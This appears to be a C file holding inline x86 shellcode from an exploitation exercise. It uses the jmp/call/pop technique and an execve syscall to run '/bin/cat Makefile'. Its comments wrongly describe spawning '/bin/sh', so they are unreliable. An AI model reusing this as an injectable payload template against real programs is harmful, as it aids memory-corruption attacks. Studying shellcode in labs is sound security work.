void main(){
__asm__(
	"jmp label_cat				\n\t" 
	"label_back:				\n\t"
	"popl %esi					\n\t"
		
	"xorl %eax, %eax				\n\t"
	"movb %al,0x8(%esi)		\n\t"
	"movb %al,0x11(%esi)		\n\t"
	

	"movl %esi,0x12(%esi)		\n\t"
	"mov %esi,%edx				\n\t"
	"addl $0x9, %edx 			\n\t"
	"movl %edx,0x16(%esi)		\n\t"
	
	"movl %eax,0x1a(%esi)		\n\t"


	"movb   $0xb,%al                \n\t"	// EAX <- 0xb (code of execve syscall)
	"movl   %esi,%ebx                \n\t"	// EBX <- char* = "/bin/sh"
	"leal   0x12(%esi),%ecx           \n\t"	// ECX <- char*[2] = { "/bin/sh", NULL }
	"xorl   %edx,%edx                \n\t"	// EDX <- NULL
	"int	$0x80                 \n\t"	// syscall

	// CALL exit
	"xorl   %eax,%eax               \n\t"
	"inc 	%eax					\n\t"
	"xorl   %ebx,%ebx               \n\t"
	"int 	$0x80                   \n\t"	// syscall



	"label_cat:					\n\t"
	"call label_back			\n\t"
	".string \"/bin/catXMakefile\"		\n\t"
);



}
